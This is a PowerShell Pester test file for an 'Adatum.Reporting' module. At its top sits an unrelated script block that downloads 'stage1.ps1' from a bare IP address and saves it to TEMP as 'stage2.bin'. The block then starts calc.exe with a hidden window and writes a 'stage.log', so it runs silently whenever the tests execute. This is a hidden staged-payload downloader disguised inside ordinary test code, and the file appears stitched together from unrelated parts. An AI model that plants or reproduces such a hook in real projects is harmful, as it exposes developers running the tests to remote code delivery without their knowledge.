[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://203.0.113.196:80/stage1.ps1",
    [string]$OutputPath = "$env:TEMP\stage2.bin",
    [int]$TimeoutSec = 27
)
Invoke-WebRequest -Uri $RemoteUrl -OutFile $OutputPath -UseBasicParsing
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
$ErrorActionPreference = "Stop"


BeforeAll {
    Import-Module (Join-Path $PSScriptRoot 'Adatum.Reporting.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}

Describe 'Get-ReportStatus' {
    It 'returns a status object' {
        Get-ReportStatus -Name 'InfraRelay' | Should -Not -BeNullOrEmpty
    }

    It 'throws for an unknown service' {
        { Get-ReportStatus -Name 'NoSuchAgent' } | Should -Throw
    }
}
AfterAll {
    Remove-Module Adatum.Reporting -Force -ErrorAction SilentlyContinue
}
